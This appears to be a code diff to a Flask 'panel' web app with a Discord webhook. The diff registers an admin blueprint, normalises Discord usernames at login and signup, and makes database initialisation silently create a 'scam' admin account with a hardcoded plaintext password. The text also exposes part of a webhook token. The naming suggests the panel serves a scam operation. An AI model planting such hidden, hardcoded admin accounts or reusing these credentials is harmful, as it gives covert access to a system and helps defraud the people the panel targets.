@@ -23,6 +23,10 @@ MASTER_WEBHOOK = "https://discord.com/api/webhooks/1499949246441324604/eY1lx462P
 DATABASE = 'panel.db'
 UPLOAD_FOLDER = 'static/uploads'
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
+
+# Import and register the admin blueprint
+from admin import admin_bp
+app.register_blueprint(admin_bp, url_prefix='/admin')
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 
@@ -83,6 +87,13 @@ def init_db():
         except sqlite3.OperationalError:
             pass
 
+        # Auto-create scam admin user
+        scam_user = db.execute("SELECT * FROM users WHERE username = 'scam'").fetchone()
+        if not scam_user:
+            db.execute(
+                'INSERT INTO users (username, password, discord_username) VALUES (?, ?, ?)',
+                ('scam', generate_password_hash('PSGfrance2123'), 'imuchcurry')
+            )
             
         db.commit()
 
@@ -130,12 +141,13 @@ def panel_login():
     if request.method == 'POST':
         username = request.form['username']
         password = request.form['password']
-        discord_username = request.form.get('discord_username', '')
+        discord_username = request.form.get('discord_username', '').strip().lower()
         
         db = get_db()
         user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
         
-        if user and check_password_hash(user['password'], password) and (user['discord_username'] == discord_username or not user['discord_username']):
+        db_discord = user['discord_username'].strip().lower() if user and user['discord_username'] else ''
+        if user and check_password_hash(user['password'], password) and (db_discord == discord_username or not user['discord_username']):
             # If user has no discord_username yet (migrated user), save it now
             if not user['discord_username'] and discord_username:
                 db.execute('UPDATE users SET discord_username = ? WHERE id = ?', (discord_username, user['id']))
@@ -158,7 +170,7 @@ def panel_signup():
     if request.method == 'POST':
         username = request.form['username']
         password = request.form['password']
-        discord_username = request.form['discord_username']
+        discord_username = request.form['discord_username'].strip().lower()
         db = get_db()
         
         if db.execute('SELECT id FROM users WHERE username = ?', (username,)).fetchone() is not None:
